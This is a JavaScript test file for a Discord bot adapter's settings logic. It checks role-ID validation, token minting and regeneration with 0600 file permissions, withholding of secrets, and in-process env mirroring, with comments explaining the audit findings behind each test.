import assert from "node:assert/strict";
import test from "node:test";
import { mkdtempSync, writeFileSync, readFileSync, existsSync, mkdirSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { execFileSync } from "node:child_process";
import {
  validateDiscordRoleIds,
  readDiscordBotSettingsState,
  enableDiscordBotAdapter,
  updateDiscordBotRoleIds,
  regenerateDiscordBotToken,
  applyDiscordBotEnableRequest,
  discordAdminRoleIdsChanged,
  persistHostedBotConnectedGuild,
  clearHostedBotConnectedGuild,
  setDeploymentChoice
} from "../src/integrations/discord/adapterSettings.js";
import { readDiscordBotApiToken } from "../src/integrations/discord/routes.js";

const OLD_ENV = { ...process.env };
test.afterEach(() => {
  process.env = { ...OLD_ENV };
});

test("validateDiscordRoleIds accepts a comma-separated list of real Discord snowflakes", () => {
  const result = validateDiscordRoleIds("111111111111111111, 222222222222222222");
  assert.deepEqual(result, { ok: true, roleIds: ["111111111111111111", "222222222222222222"] });
});

test("validateDiscordRoleIds rejects a non-numeric value", () => {
  const result = validateDiscordRoleIds("not-a-role-id");
  assert.equal(result.ok, false);
});

test("validateDiscordRoleIds rejects a too-short numeric value (not a real snowflake)", () => {
  const result = validateDiscordRoleIds("123");
  assert.equal(result.ok, false);
});

test("validateDiscordRoleIds accepts an empty string as no role IDs configured", () => {
  const result = validateDiscordRoleIds("");
  assert.deepEqual(result, { ok: true, roleIds: [] });
});

test("readDiscordBotSettingsState reports disabled with no role IDs when nothing is configured", () => {
  delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
  delete process.env.DISCORD_PLAYER_ROLE_IDS;
  const state = readDiscordBotSettingsState({});
  assert.equal(state.enabled, false);
  assert.deepEqual(state.roleIds, { player: [], moderator: [], admin: [] });
  assert.equal(state.tokenConfigured, false);
});

// Real UAT finding (2026-09-09): "Connect to hosted bot" needs its own,
// independent Discord Application -- deliberately separate from Settings
// -> Discord OAuth's console-sign-in credentials ("we have OAuth without
// bot and bot without OAuth"). readDiscordBotSettingsState() is where the
// frontend learns whether that's configured -- it must read the NEW,
// independent config fields, never fall back to the sign-in ones, and
// must never return the secret itself.
test("readDiscordBotSettingsState reports the hosted-bot OAuth app's own config, independent of console-sign-in OAuth", () => {
  const configured = readDiscordBotSettingsState({
    discordHostedBotOAuthClientId: "999999999999999999",
    discordHostedBotOAuthClientSecret: "shh-do-not-return-this",
    discordHostedBotOAuthRedirectUri: "https://example.com/callback",
    // Deliberately different sign-in credentials present too -- proves
    // this reads the hosted-bot-specific fields, not these.
    discordOAuthClientId: "111111111111111111",
    discordOAuthClientSecret: "unrelated-sign-in-secret"
  });
  assert.equal(configured.hostedBotOAuthConfigured, true);
  assert.equal(configured.hostedBotOAuthClientId, "999999999999999999");
  assert.equal(configured.hostedBotOAuthRedirectUri, "https://example.com/callback");
  assert.equal("hostedBotOAuthClientSecret" in configured, false, "the secret itself must never be returned");
  assert.ok(!JSON.stringify(configured).includes("shh-do-not-return-this"), "the secret value must not appear anywhere in the response");

  const unconfigured = readDiscordBotSettingsState({});
  assert.equal(unconfigured.hostedBotOAuthConfigured, false);
  assert.equal(unconfigured.hostedBotOAuthClientId, null);
  assert.equal(unconfigured.hostedBotOAuthRedirectUri, null);

  const partial = readDiscordBotSettingsState({
    discordHostedBotOAuthClientId: "999999999999999999",
    discordHostedBotOAuthRedirectUri: "https://example.com/callback"
    // No client secret -- must not report configured with only 2 of 3 set.
  });
  assert.equal(partial.hostedBotOAuthConfigured, false, "all 3 fields must be present to report configured");
});

test("readDiscordBotSettingsState reports enabled with existing role IDs -- the state-detection fix for pre-existing manual configs", () => {
  process.env.DUNE_DISCORD_ADAPTER_ENABLED = "true";
  process.env.DISCORD_PLAYER_ROLE_IDS = "111111111111111111";
  process.env.DISCORD_MODERATOR_ROLE_IDS = "222222222222222222";
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-settings-"));
  const tokenFile = join(dir, "discord-adapter-token.txt");
  writeFileSync(tokenFile, "existing-token-value\n");
  process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;

  const state = readDiscordBotSettingsState({});
  assert.equal(state.enabled, true);
  assert.deepEqual(state.roleIds.player, ["111111111111111111"]);
  assert.deepEqual(state.roleIds.moderator, ["222222222222222222"]);
  assert.equal(state.tokenConfigured, true);
});

test("updateDiscordBotRoleIds writes only the 3 role-ID keys and never touches the token file or the enabled flag", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-roleids-"));
  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
  writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_ENABLED=true\nDUNE_DISCORD_ADAPTER_TOKEN_FILE=runtime/secrets/discord-adapter-token.txt\n");
  writeFileSync(tokenFile, "existing-token-value\n");

  const result = await updateDiscordBotRoleIds({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: ["222222222222222222"] });
  assert.equal(result.ok, true);

  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_ENABLED=true$/m, "the enabled flag must be untouched");
  assert.match(envContent, /^DISCORD_PLAYER_ROLE_IDS=111111111111111111$/m);
  assert.match(envContent, /^DISCORD_ADMIN_ROLE_IDS=222222222222222222$/m);
  const tokenContent = readFileSync(tokenFile, "utf8").trim();
  assert.equal(tokenContent, "existing-token-value", "role-ID updates must never rotate the live token");
});

test("regenerateDiscordBotToken overwrites the token file with fresh random bytes, and (idempotently) writes the token FILE PATH in .env to the canonical default (Finding 2)", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-"));
  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
  mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
  writeFileSync(join(dir, ".env"), "SOME_OTHER_KEY=untouched\n");
  writeFileSync(tokenFile, "old-token-value\n");

  const result = await regenerateDiscordBotToken({ repoRoot: dir });
  assert.equal(result.ok, true);
  assert.equal(result.token.length, 64, "expected a 32-byte hex token returned so the caller can display it once");
  const newToken = readFileSync(tokenFile, "utf8").trim();
  assert.notEqual(newToken, "old-token-value");
  assert.equal(newToken, result.token);
  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^SOME_OTHER_KEY=untouched$/m);
  // Finding 2 (IMPORTANT, final review): regenerate must (re-)write the
  // token FILE PATH key to the canonical default, idempotently -- see the
  // dedicated Finding 2 test below for the exact scenario this closes (an
  // operator with only the legacy DUNE_BOT_API_TOKEN_FILE set). This
  // assertion previously required the opposite (no rewrite at all); that
  // was the bug -- see this test's git history for the pre-fix version.
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_TOKEN_FILE="runtime\/secrets\/discord-adapter-token\.txt"$/m, "regenerate must ensure the token FILE PATH key in .env points at the canonical default, so it can never lose precedence to a legacy DUNE_BOT_API_TOKEN_FILE");
});

// Finding 2 (IMPORTANT, final review): regenerateDiscordBotToken() rewrote
// the token file's CONTENT but never wrote the token FILE PATH
// (DUNE_DISCORD_ADAPTER_TOKEN_FILE) key to .env or process.env. An operator
// whose .env has ONLY the legacy DUNE_BOT_API_TOKEN_FILE set (no
// DUNE_DISCORD_ADAPTER_TOKEN_FILE at all -- a real, documented manual-setup
// path that predates this feature) clicks Regenerate Token, is shown a
// fresh token, but readDiscordBotApiToken()'s precedence chain
// (DUNE_DISCORD_ADAPTER_TOKEN_FILE || DUNE_BOT_API_TOKEN_FILE) still falls
// through to the untouched legacy var, which still points at the OLD file
// -- the new token is never actually used to authenticate.
test("regenerateDiscordBotToken makes the fresh token authoritative even when only the legacy DUNE_BOT_API_TOKEN_FILE was previously configured (Finding 2)", async () => {
  delete process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE;
  delete process.env.DUNE_DISCORD_ADAPTER_TOKEN;
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-legacy-file-"));
  const legacyTokenFile = join(dir, "old-manual-token.txt");
  writeFileSync(legacyTokenFile, "old-manual-token-value\n");
  writeFileSync(join(dir, ".env"), `DUNE_BOT_API_TOKEN_FILE=${legacyTokenFile}\n`);
  process.env.DUNE_BOT_API_TOKEN_FILE = legacyTokenFile;

  const result = await regenerateDiscordBotToken({ repoRoot: dir });
  assert.equal(result.ok, true);

  // The exact scenario that was silently broken: read the token back
  // through the SAME function the live adapter route uses to authenticate
  // requests, in the SAME process, with no restart in between.
  const resolvedToken = readDiscordBotApiToken({ repoRoot: dir });
  assert.equal(resolvedToken, result.token, "the freshly-minted token must be authoritative, not the stale value at the legacy DUNE_BOT_API_TOKEN_FILE path");

  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_TOKEN_FILE="runtime\/secrets\/discord-adapter-token\.txt"$/m, "regenerate must write the token FILE PATH key so it takes precedence over the legacy var on a future restart too, not just in this process");
});

// Audit finding #4 (HIGH): readDiscordBotApiToken() (routes.js) checks the
// direct DUNE_DISCORD_ADAPTER_TOKEN env var BEFORE the token file. If an
// operator set that var directly (a real, documented manual-setup path),
// Enable/Regenerate must clear it -- otherwise the UI shows a fresh,
// plausible-looking token that the live adapter never actually uses to
// authenticate, because the untouched direct env var keeps winning.
test("enableDiscordBotAdapter clears a direct DUNE_DISCORD_ADAPTER_TOKEN value in .env so the file-based token becomes authoritative", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-clears-direct-"));
  writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_TOKEN=some-direct-manual-value\n");

  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
  assert.equal(result.ok, true);

  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_TOKEN=""$/m, "the direct token env var must be cleared, not left pointing at a now-dead credential");
});

test("regenerateDiscordBotToken clears a direct DUNE_DISCORD_ADAPTER_TOKEN value in .env for the same reason", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-clears-direct-"));
  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
  mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
  writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_TOKEN=some-direct-manual-value\n");
  writeFileSync(tokenFile, "old-token-value\n");

  const result = await regenerateDiscordBotToken({ repoRoot: dir });
  assert.equal(result.ok, true);

  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_TOKEN=""$/m, "the direct token env var must be cleared on regenerate too, or the freshly-shown token would never actually be used");
});

test("readDiscordBotSettingsState: enabled flag true but token file missing reports enabled with tokenConfigured false", () => {
  process.env.DUNE_DISCORD_ADAPTER_ENABLED = "true";
  process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = "/nonexistent/path/discord-adapter-token.txt";
  const state = readDiscordBotSettingsState({});
  assert.equal(state.enabled, true);
  assert.equal(state.tokenConfigured, false);
});

test("readDiscordBotSettingsState: token file present but enabled flag false/unset reports disabled -- an abandoned manual attempt, not a live config", () => {
  delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-abandoned-"));
  const tokenFile = join(dir, "discord-adapter-token.txt");
  writeFileSync(tokenFile, "leftover-from-a-manual-attempt\n");
  process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
  const state = readDiscordBotSettingsState({});
  assert.equal(state.enabled, false, "an abandoned token file with the enabled flag off must still report disabled -- enabled comes from the flag, not file presence");
  assert.equal(state.tokenConfigured, true, "but tokenConfigured should still reflect the file's real presence, since Enable must not blindly overwrite it without the operator seeing it exists");
});

test("readDiscordBotSettingsState: role IDs set independently of the enabled flag are still reported", () => {
  delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
  process.env.DISCORD_ADMIN_ROLE_IDS = "333333333333333333";
  const state = readDiscordBotSettingsState({});
  assert.equal(state.enabled, false);
  assert.deepEqual(state.roleIds.admin, ["333333333333333333"]);
});

// Audit finding #1 (CRITICAL): a bare POST to /enable must not silently
// re-mint the live token once the adapter is already enabled -- that
// would let an admin (updates:apply) achieve the exact effect the
// owner-only settings:discord-bot-regenerate-token gate exists to
// restrict. Repeat calls to /enable, once already enabled, must behave
// exactly like /role-ids: token-safe and idempotent.
test("applyDiscordBotEnableRequest mints a token on a genuine first enable (from disabled)", async () => {
  delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-apply-first-enable-"));

  const result = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: [] });
  assert.equal(result.ok, true);
  assert.equal(result.tokenMinted, true, "a genuine first enable must mint a token");
  assert.equal(result.token.length, 64);

  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_ENABLED=true$/m);
  assert.match(envContent, /^DISCORD_PLAYER_ROLE_IDS=111111111111111111$/m);
});

test("applyDiscordBotEnableRequest does NOT mint a new token when the adapter is already enabled -- it only updates role IDs, exactly like updateDiscordBotRoleIds", async () => {
  process.env.DUNE_DISCORD_ADAPTER_ENABLED = "true";
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-apply-reenable-"));
  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
  writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_ENABLED=true\nDUNE_DISCORD_ADAPTER_TOKEN_FILE=runtime/secrets/discord-adapter-token.txt\n");
  writeFileSync(tokenFile, "token-a-must-be-unchanged\n");

  const result = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["222222222222222222"], moderator: [], admin: [] });
  assert.equal(result.ok, true);
  assert.equal(result.tokenMinted, false, "re-POSTing /enable on an already-enabled adapter must not mint a new token");
  assert.equal(result.token, undefined, "the response must carry no token field when none was minted");

  const tokenContent = readFileSync(tokenFile, "utf8").trim();
  assert.equal(tokenContent, "token-a-must-be-unchanged", "the live token file must be untouched");
  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DISCORD_PLAYER_ROLE_IDS=222222222222222222$/m, "role IDs must still be applied");
});

// Audit finding #1 residual gap (Important, second review round): writing
// a new value to .env on disk does NOT update the RUNNING process's own
// process.env -- that only happens when the container restarts and
// re-reads env vars fresh. discordAdapterEnabled() reads
// process.env.DUNE_DISCORD_ADAPTER_ENABLED directly, so between a first
// successful Enable (which writes .env and queues a container-recreate
// task that finishes asynchronously) and that recreate actually
// completing, a second /enable call landing in this SAME, not-yet-
// recreated process must still see enabled:true -- otherwise it
// re-evaluates as "not yet enabled" and mints a SECOND fresh token,
// reproducing finding #1's original bug inside a race window instead of
// closing it. This simulates that exact scenario: two sequential calls
// into the real business-logic layer against ONE persistent process
// state (no resetting process.env between calls, no separate pre-set
// .env per call), not two independent pure-function invocations.
test("applyDiscordBotEnableRequest: a second call before the container recreate completes must not mint a second token (in-process staleness)", async () => {
  delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-double-enable-"));

  const first = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: [] });
  assert.equal(first.tokenMinted, true, "the genuine first enable must mint a token");

  // Nothing has restarted this process -- simulate the second /enable POST
  // landing before the queued recreate task finishes.
  const second = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["222222222222222222"], moderator: [], admin: [] });
  assert.equal(second.tokenMinted, false, "a second enable call before the recreate completes must not mint a second token");
  assert.equal(second.token, undefined);

  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  const tokenContent = readFileSync(tokenFile, "utf8").trim();
  assert.equal(tokenContent, first.token, "the live token file must still hold the first-minted token, unchanged by the second call");
});

// Audit finding #4 residual gap (Important, second review round): the
// same in-process-vs-.env-file staleness applies to the direct
// DUNE_DISCORD_ADAPTER_TOKEN var. regenerateDiscordBotToken() deliberately
// never triggers a container recreate (the token file's content is read
// fresh per request, so no recreate should be needed) -- which means
// nothing will EVER refresh process.env for this specific path. An
// operator who previously set DUNE_DISCORD_ADAPTER_TOKEN directly (the
// documented manual-setup path) has that value already loaded into the
// running process's process.env; clearing it in .env alone leaves
// readDiscordBotApiToken() -- which reads process.env directly -- still
// returning the stale direct value forever, in the exact same process,
// with no restart to ever fix it.
// Finding 5 (LOW, Layer 3 test-coverage audit): enableDiscordBotAdapter()
// and regenerateDiscordBotToken() both write the token file with
// { mode: 0o600 } plus a belt-and-braces chmodSync -- but nothing asserted
// this. A future refactor that accidentally dropped the mode option would
// silently regress to a more permissive default (whatever the process
// umask allows) with nothing catching it.
test("enableDiscordBotAdapter writes the token file with mode 0600", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-mode-"));

  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });

  const stat = statSync(join(dir, "runtime", "secrets", "discord-adapter-token.txt"));
  assert.equal(stat.mode & 0o777, 0o600, "the freshly minted token file must be owner-read/write only");
  assert.equal(result.ok, true);
});

test("regenerateDiscordBotToken writes the token file with mode 0600", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-mode-"));
  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
  mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
  writeFileSync(tokenFile, "old-token-value\n", { mode: 0o644 });

  const result = await regenerateDiscordBotToken({ repoRoot: dir });

  const stat = statSync(tokenFile);
  assert.equal(stat.mode & 0o777, 0o600, "the regenerated token file must be owner-read/write only, even if the pre-existing file had a looser mode");
  assert.equal(result.ok, true);
});

test("regenerateDiscordBotToken clears the direct token in the RUNNING process too, so readDiscordBotApiToken() immediately returns the new file token in the same process", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-inprocess-"));
  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
  writeFileSync(tokenFile, "old-token-value\n");
  process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
  // Simulate an already-running process that loaded a direct manual token
  // at container start -- .env may get rewritten by the time we get here,
  // but THIS process's own process.env still has the old value until
  // something explicitly clears it.
  process.env.DUNE_DISCORD_ADAPTER_TOKEN = "stale-direct-value-loaded-at-container-start";

  const result = await regenerateDiscordBotToken({ repoRoot: dir });
  assert.equal(result.ok, true);

  // The exact scenario that was silently broken: read the token back
  // through the SAME function the live adapter route uses to authenticate
  // requests, in the SAME process, with no restart in between.
  const resolvedToken = readDiscordBotApiToken({ repoRoot: dir });
  assert.equal(resolvedToken, result.token, "the running process must immediately see the freshly-minted file token, not the stale direct value");
});

test("enableDiscordBotAdapter also clears DUNE_DISCORD_ADAPTER_TOKEN in the RUNNING process, not just in .env", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-inprocess-clear-"));
  process.env.DUNE_DISCORD_ADAPTER_TOKEN = "stale-direct-value-loaded-at-container-start";

  await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });

  assert.equal(process.env.DUNE_DISCORD_ADAPTER_TOKEN, "", "the running process's own env var must be cleared immediately, not just the .env file on disk");
});

// Found while adding Layer 3 route-level integration coverage
// (discordAdapterSettingsRoutes.integration.test.js): enableDiscordBotAdapter()
// already mirrors `enabled` and the cleared direct token into the RUNNING
// process's env (see the two tests above) for the exact same reason --
// writing .env to disk does not change what an already-running process sees.
// It never mirrored DUNE_DISCORD_ADAPTER_TOKEN_FILE the same way, so
// readDiscordBotSettingsState() -> readDiscordBotApiToken() (which reads
// process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE directly) kept reporting
// tokenConfigured:false in the SAME process immediately after a genuine
// first enable, even though the token file had just been written to disk --
// an operator viewing the settings page right after enabling would see "no
// token configured" until the console itself restarted.
test("enableDiscordBotAdapter mirrors the token file path into the RUNNING process too, so a read immediately after enable in the same process reports tokenConfigured:true", async () => {
  delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
  delete process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE;
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-mirrors-tokenfile-"));

  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
  assert.equal(result.ok, true);

  const state = readDiscordBotSettingsState({ repoRoot: dir });
  assert.equal(state.tokenConfigured, true, "the freshly minted token must be visible in this same process immediately, not only after a restart");
});

// Same class of gap as the token-file mirroring test above, for the 3
// role-ID env keys: discordRoleMappingFromEnv() (adapter.js) reads
// DISCORD_PLAYER_ROLE_IDS/DISCORD_MODERATOR_ROLE_IDS/DISCORD_ADMIN_ROLE_IDS
// from process.env directly. enableDiscordBotAdapter() writes them to .env
// on disk but, before this fix, never mirrored them into the RUNNING
// process -- a GET of the settings state in the same process, in the window
// before the queued console restart completes, would report the role IDs
// that were configured BEFORE this enable call, not what was just submitted.
test("enableDiscordBotAdapter mirrors the role-ID env keys into the RUNNING process too, so a read immediately after enable reflects what was just submitted", async () => {
  delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
  delete process.env.DISCORD_PLAYER_ROLE_IDS;
  delete process.env.DISCORD_MODERATOR_ROLE_IDS;
  delete process.env.DISCORD_ADMIN_ROLE_IDS;
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-mirrors-roleids-"));

  await enableDiscordBotAdapter({ repoRoot: dir }, { player: ["111111111111111111"], moderator: ["222222222222222222"], admin: [] });

  const state = readDiscordBotSettingsState({ repoRoot: dir });
  assert.deepEqual(state.roleIds.player, ["111111111111111111"], "the freshly submitted player role IDs must be visible in this same process immediately");
  assert.deepEqual(state.roleIds.moderator, ["222222222222222222"]);
});

// Same gap, for updateDiscordBotRoleIds() (the /role-ids route, and the
// "already enabled" branch of applyDiscordBotEnableRequest) -- this is the
// function an admin editing role IDs on an already-live adapter actually
// goes through, so this is the more commonly hit path in practice.
test("updateDiscordBotRoleIds mirrors the role-ID env keys into the RUNNING process too, so a read immediately after saving reflects what was just submitted", async () => {
  process.env.DISCORD_PLAYER_ROLE_IDS = "111111111111111111";
  delete process.env.DISCORD_MODERATOR_ROLE_IDS;
  delete process.env.DISCORD_ADMIN_ROLE_IDS;
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-roleids-mirrors-"));

  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: ["333333333333333333"], moderator: ["444444444444444444"], admin: [] });

  const state = readDiscordBotSettingsState({ repoRoot: dir });
  assert.deepEqual(state.roleIds.player, ["333333333333333333"], "the newly saved player role IDs must be visible in this same process immediately, not the pre-save value");
  assert.deepEqual(state.roleIds.moderator, ["444444444444444444"]);
});

// Task 2 (hosted-bot console-initiated OAuth registration plan): the
// hosted/self-hosted `choice` toggle in DiscordBotSection.tsx previously
// lived only in browser localStorage -- never sent to or read from the
// backend. Task 6's /register route needs a real, persisted,
// server-readable value to gate against, so this is the one env key this
// feature is allowed to write for it.
test("readDiscordBotSettingsState reports deploymentChoice as null when never set", () => {
  delete process.env.DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE;
  const state = readDiscordBotSettingsState({});
  assert.equal(state.deploymentChoice, null);
});

test("enableDiscordBotAdapter persists deploymentChoice, and readDiscordBotSettingsState reflects it", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-"));
  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "hosted" });
  assert.equal(result.ok, true);
  // No manual process.env write needed here -- enableDiscordBotAdapter()
  // already mirrors the normalized choice into process.env itself (the
  // same in-process-staleness mirroring it does for enabled/token/role-ID
  // keys), so readDiscordBotSettingsState() below sees it immediately.
  const state = readDiscordBotSettingsState({});
  assert.equal(state.deploymentChoice, "hosted");
  delete process.env.DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE;
});

// Fix round 1 (reviewer finding, Minor): lock in the silently-ignored-not-
// written behavior for an invalid deploymentChoice, through both mutators
// -- normalizeDeploymentChoice() itself isn't exported, so this exercises
// it via its two real callers.
test("enableDiscordBotAdapter silently ignores an invalid deploymentChoice instead of writing it", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-invalid-enable-"));
  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "HOSTED" });
  assert.equal(result.ok, true);
  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.doesNotMatch(envContent, /DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE/, "an invalid deploymentChoice value must never be written to .env");
  const state = readDiscordBotSettingsState({ repoRoot: dir });
  assert.equal(state.deploymentChoice, null);
});

test("updateDiscordBotRoleIds silently ignores an invalid or empty deploymentChoice instead of writing it, and never clobbers an existing valid value", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-invalid-update-"));
  writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted\n");

  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "" });
  let envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted$/m, "an empty deploymentChoice must not overwrite the existing persisted value");

  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: 123 });
  envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted$/m, "a non-string deploymentChoice must not overwrite the existing persisted value either");
});

test("updateDiscordBotRoleIds persists an updated deploymentChoice without touching the token", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-update-"));
  const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
  mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
  writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_ENABLED=true\n");
  writeFileSync(tokenFile, "existing-token\n");
  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "self-hosted" });
  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted$/m);
  assert.equal(readFileSync(tokenFile, "utf8").trim(), "existing-token", "role-ID/choice updates must never touch the token file");
});

// Audit finding #2 (HIGH): admin must not be able to grant Discord
// "admin" bot-command tier to an arbitrary role via /enable or
// /role-ids -- the route handler uses this comparison to decide whether
// owner-only gating applies.
test("discordAdminRoleIdsChanged reports false when the admin role ID set is unchanged (order-independent)", () => {
  assert.equal(discordAdminRoleIdsChanged(["111111111111111111", "222222222222222222"], ["222222222222222222", "111111111111111111"]), false);
});

test("discordAdminRoleIdsChanged reports false when neither current nor requested has any admin role IDs", () => {
  assert.equal(discordAdminRoleIdsChanged([], []), false);
});

test("discordAdminRoleIdsChanged reports true when an admin role ID is added", () => {
  assert.equal(discordAdminRoleIdsChanged([], ["111111111111111111"]), true);
});

test("discordAdminRoleIdsChanged reports true when an admin role ID is removed", () => {
  assert.equal(discordAdminRoleIdsChanged(["111111111111111111"], []), true);
});

test("discordAdminRoleIdsChanged reports true when the admin role ID set is swapped for a different one of the same size", () => {
  assert.equal(discordAdminRoleIdsChanged(["111111111111111111"], ["222222222222222222"]), true);
});

// Final integration review (Important #5): persistHostedBotConnectedGuild()
// is what makes "Connected to hosted bot for {name}" survive a page reload
// instead of being pure in-memory React state -- these lock in its
// persist-and-mirror contract, matching the same discipline every other
// mutator in this file already has its own tests for.
test("persistHostedBotConnectedGuild persists both the guild id and name, and readDiscordBotSettingsState reflects them immediately in this process", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-"));
  const result = await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
  assert.equal(result.ok, true);
  const envContent = readFileSync(join(dir, ".env"), "utf8");
  assert.match(envContent, /^DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID=111111111111111111$/m);
  assert.match(envContent, /^DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME=Fleetyard$/m);
  // No manual process.env write needed -- persistHostedBotConnectedGuild()
  // mirrors into the running process itself, same as every other mutator
  // in this file.
  const state = readDiscordBotSettingsState({});
  assert.equal(state.hostedBotConnectedGuildId, "111111111111111111");
  assert.equal(state.hostedBotConnectedGuildName, "Fleetyard");
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

test("readDiscordBotSettingsState reports the hosted-bot connected guild fields as null when never set", () => {
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
